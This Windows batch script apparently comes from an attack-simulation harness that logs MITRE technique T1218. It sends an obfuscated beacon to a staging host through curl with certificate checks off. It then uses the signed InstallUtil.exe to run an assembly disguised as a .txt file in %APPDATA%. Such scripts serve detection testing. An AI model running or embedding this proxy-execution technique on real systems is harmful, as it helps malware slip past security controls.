@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\9706\d9f69918
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9706-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=firelox.txt
SET ewjmdkff=9706
SET logfile=%APPDATA%\!pudaazx!\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_start=>> "!logfile!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [%DATE% %TIME%][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_complete=>> "!logfile!" 2>nul

echo [%DATE% %TIME%][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_start=>> "!logfile!" 2>nul
cd /d "!pjkcpgw!" >nul 2>&1
if errorlevel 1 (
    echo [%DATE% %TIME%][TTP][!hlbnp!][!ewjmdkff!]: T1218|Signed Binary Proxy Execution: InstallUtil=0:directory_not_found>> "!logfile!" 2>nul
    exit /b 1
)
echo [%DATE% %TIME%][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_complete=>> "!logfile!" 2>nul

SET res=1
SET err=
echo [%DATE% %TIME%][DEBUG][!hlbnp!][!ewjmdkff!]: command_start=>> "!logfile!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "!syjfr!" >nul 2>&1
if errorlevel 1 (
    SET res=0
    SET err=installutil_failed
)
echo [%DATE% %TIME%][DEBUG][!hlbnp!][!ewjmdkff!]: command_complete=>> "!logfile!" 2>nul

SET normtime=!DATE:~6,4!-!DATE:~3,2!-!DATE:~0,2! !TIME!
SET normtime=!normtime:,=.! 
echo [!normtime!][TTP][!hlbnp!][!ewjmdkff!]: T1218|Signed Binary Proxy Execution: InstallUtil=!res!:!err!>> "!logfile!" 2>nul
ENDLOCAL